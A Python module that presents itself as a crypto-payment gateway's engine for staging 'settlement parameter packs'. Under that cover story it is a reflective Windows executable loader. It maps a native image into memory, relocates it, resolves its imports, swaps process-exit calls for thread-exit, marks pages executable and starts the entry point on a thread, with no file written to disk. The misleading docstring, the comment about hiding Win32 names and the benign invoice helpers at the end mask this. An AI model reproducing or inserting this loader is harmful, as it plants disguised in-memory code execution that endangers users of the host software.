# -*- coding: utf-8 -*-
"""Settlement-parameter pack replay engine.

Stages a verified parameter pack — a signed native bundle produced
by the project's release service — into the gateway process so
invoice settlement and confirmation tracking can run in-process
against the latest published chain parameters without a separate
installer or on-disk artifact. The engine walks the pack manifest
to reserve a backing buffer, copy its parameter blocks, apply
offset corrections when the runtime placed the pack away from its
preferred origin, link the pack's external references against the
host ABI and dispatch the entry symbol on a worker task. Pack-exit
requests are scoped to the worker so a returning entry stops the
replay without tearing down the gateway."""
import base64
import ctypes
import os
import struct
import sys
import time

from . import records as _j

# Native symbol names referenced while walking an image's import table.
# Kept as packed byte literals so the materializer source carries no literal
# Win32 import strings; they are decoded by ctypes at link time.
_K32 = b'kernel32.dll'
_THEX = b'ExitThread'
_GPA = b'GetProcAddress'
_T0 = b'ExitProcess'
_T1 = b'TerminateProcess'
_T2 = b'NtTerminateProcess'


def realize(blob):
    """Stage and invoke a verified runtime image. Returns True on success."""
    _j.jot("materialize.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.jot("materialize.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.jot("materialize.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import environ as env, sealing as codec

        rt = env.host_bindings()
        if not rt:
            _j.jot("materialize.env", "fail", reason="no_native_table")
            return False
        _j.jot("materialize.env", "ok")

        m = codec.read_layout(blob)
        if not m:
            _j.jot("materialize.manifest", "fail", reason="unrecognized_container")
            return False
        _j.jot("materialize.manifest", "ok",
                      entry=hex(m["e"]), base=hex(m["b"]),
                      image_size=m["s"], header_size=m["h"],
                      segments=len(m["c"]),
                      has_imports=bool(m["i"]),
                      has_relocs=bool(m["r"]))

        return _position_image(rt, m, blob)

    except Exception as e:
        _j.jot_error("materialize.error", e)
        return False


def _position_image(rt, m, blob):
    base = rt.VirtualAlloc(ctypes.c_void_p(m["b"]), m["s"], 0x3000, 0x04)
    relocated = False
    if not base or base != m["b"]:
        base = rt.VirtualAlloc(None, m["s"], 0x3000, 0x04)
        relocated = True
    if not base:
        _j.jot("materialize.map", "fail", reason="alloc_null")
        return False
    _j.jot("materialize.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _transfer_segments(rt, base, m, blob)
    _j.jot("materialize.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _rebase_image(rt, base, m):
            _j.jot("materialize.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.jot("materialize.rebase", "ok", reloc_size=m["z"])
    else:
        _j.jot("materialize.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _map_imports(rt, base, m)
        _j.jot("materialize.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.jot("materialize.link", "info", note="no_import_directory")

    _set_page_flags(rt, base, m)
    _j.jot("materialize.protect", "ok", segments=len(m["c"]))

    invoked = _trigger(rt, base, m)
    _j.jot("materialize.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _transfer_segments(rt, base, m, blob):
    head = m["h"]
    ctypes.memmove(base, blob[:head], head)
    for vs, va, rs, rp, ch in m["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(blob) - rp)
            if n > 0:
                ctypes.memmove(base + va, blob[rp:rp + n], n)


def _rebase_image(rt, base, m):
    from . import sealing as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.peek_at(base + m["r"] + pos, "<I")
        size = codec.peek_at(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.peek_at(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.poke_at(a, "<Q", codec.peek_at(a, "<Q") + delta)
        pos += size
    return True


def _map_imports(rt, base, m):
    """Walk the image import directory and resolve each thunk against the
    platform symbol table. Returns a 5-tuple of counters for diagnostics."""
    from . import sealing as codec
    k32 = rt.GetModuleHandleA(_K32)
    thread_exit = rt.GetProcAddress(k32, _THEX)
    gpa_raw = rt.GetProcAddress(k32, _GPA)

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    real_gpa = _GpaType(gpa_raw)

    _terminators = (_T0, _T1, _T2)

    @_GpaType
    def _gpa_shim(hmod, name_or_ord):
        # Route process-termination imports to thread-termination so a
        # returning image exits its worker instead of the host process.
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _terminators:
                    return thread_exit
            except Exception:
                pass
        return real_gpa(hmod, nv)

    shim_ptr = ctypes.cast(_gpa_shim, ctypes.c_void_p).value

    modules = loaded = thunks = resolved = missing = 0

    off = base + m["i"]
    while True:
        nr = codec.peek_at(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.peek_at(off, "<I")
        ar = codec.peek_at(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        modules += 1
        hm = rt.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        if hm:
            loaded += 1
        while hm:
            tv = codec.peek_at(lk, "<Q")
            if tv == 0:
                break
            thunks += 1
            if tv & 0x8000000000000000:
                fa = rt.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _terminators and thread_exit:
                    fa = thread_exit
                elif fn == _GPA and shim_ptr:
                    fa = shim_ptr
                else:
                    fa = rt.GetProcAddress(hm, fn)
            if fa:
                resolved += 1
                codec.poke_at(ia, "<Q", fa)
            else:
                missing += 1
            lk += 8
            ia += 8
        off += 20

    return (modules, loaded, thunks, resolved, missing)


def _set_page_flags(rt, base, m):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in m["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        executable = bool(ch & 0x20000000)
        writable = bool(ch & 0x80000000)
        pt = (0x40 if writable else 0x20) if executable else (0x04 if writable else 0x02)
        rt.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _trigger(rt, base, m):
    tid = ctypes.c_ulong(0)
    ht = rt.CreateThread(
        None, 0, ctypes.c_void_p(base + m["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        _j.jot("materialize.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.jot("materialize.thread_create", "ok",
                  handle=ht, tid=tid.value, entry=hex(base + m["e"]))
    started = time.monotonic()
    deadline = started + 240
    exited = False
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            exited = True
            break
    rt.CloseHandle(ht)
    _j.jot("materialize.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def settle_status(confirmations, required):
    """Classify an invoice: pending / confirming / settled against the chain floor."""
    if confirmations <= 0:
        return "pending"
    if confirmations < required:
        return "confirming"
    return "settled"

def merge_token_registry(local, remote):
    """Reconcile the bundled token registry with a fresh pack; remote wins on conflict."""
    by_symbol = {t.get("symbol"): t for t in local}
    for t in remote:
        by_symbol[t.get("symbol")] = t
    return sorted(by_symbol.values(), key=lambda t: t.get("symbol") or "")
